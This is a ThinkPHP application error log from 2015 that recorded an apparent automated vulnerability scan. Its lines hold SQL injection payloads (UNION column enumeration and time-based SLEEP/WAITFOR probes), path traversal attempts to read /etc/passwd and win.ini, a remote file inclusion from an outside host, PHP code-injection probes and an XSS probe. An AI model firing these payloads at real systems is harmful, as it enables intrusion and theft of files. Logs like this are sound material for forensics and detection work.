[ 2015-09-23T21:22:26+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T21:22:26+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T21:22:27+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:27+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:28+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:28+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:29+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:30+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:30+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T21:22:31+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T21:22:31+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T21:22:32+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:32+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:33+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:33+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:34+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:35+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:35+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:36+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:36+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T21:22:37+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T21:22:37+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T21:22:38+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:39+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:39+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:40+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:40+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:41+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:41+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:42+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:42+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:43+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:43+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T21:22:44+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T21:22:45+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T21:22:45+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:46+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:46+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:47+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:47+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:48+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:48+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:49+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:50+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:50+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:51+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:51+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:52+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T21:22:52+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T21:22:53+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T21:22:53+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:54+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:55+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:55+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:56+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:56+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:57+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:57+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:58+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:58+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:22:59+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:23:00+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:23:00+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:23:01+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T21:23:01+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T21:23:02+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T21:23:02+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T21:23:03+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:04+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:04+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:05+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:05+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:06+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:06+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:07+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:07+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:08+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:09+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:23:09+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:23:10+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:23:10+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:23:11+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T21:23:11+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T21:23:12+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T21:23:12+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T21:23:13+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T21:23:14+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:14+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:15+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:15+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:16+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:16+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:17+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:17+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:18+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:23:20+08:00 ] ERR: (ThinkException) 无法加载模块Deal AND SLEEP(5)
[ 2015-09-23T21:23:20+08:00 ] ERR: (ThinkException) 无法加载模块Deal AND SLEEP(5) #
[ 2015-09-23T21:23:21+08:00 ] ERR: (ThinkException) 无法加载模块Deal; SELECT PG_SLEEP(5)--
[ 2015-09-23T21:23:21+08:00 ] ERR: (ThinkException) 无法加载模块Deal; SELECT SLEEP(5)-- 
[ 2015-09-23T21:23:22+08:00 ] ERR: (ThinkException) 无法加载模块Deal'; SELECT SLEEP(5)-- 
[ 2015-09-23T21:23:23+08:00 ] ERR: (ThinkException) 无法加载模块Deal) AND SLEEP(5) #
[ 2015-09-23T21:23:23+08:00 ] ERR: (ThinkException) 无法加载模块Deal'; SELECT SLEEP(5)--
[ 2015-09-23T21:23:24+08:00 ] ERR: (ThinkException) 无法加载模块Deal WAITFOR DELAY '0:0:5'--
[ 2015-09-23T21:23:26+08:00 ] ERR: (ThinkException) 无法加载模块/etc/passwd
[ 2015-09-23T21:23:41+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd
[ 2015-09-23T21:24:23+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd .jpg
[ 2015-09-23T21:24:34+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../../../etc/passwd%00
[ 2015-09-23T21:24:46+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini
[ 2015-09-23T21:25:00+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini .jpg
[ 2015-09-23T21:25:16+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-23T21:25:27+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-23T21:25:39+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-23T21:26:09+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-23T21:26:19+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-23T21:26:33+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
[ 2015-09-23T21:26:45+08:00 ] ERR: (ThinkException) 无法加载模块'"><scRipt>alert(98733)</sCript>
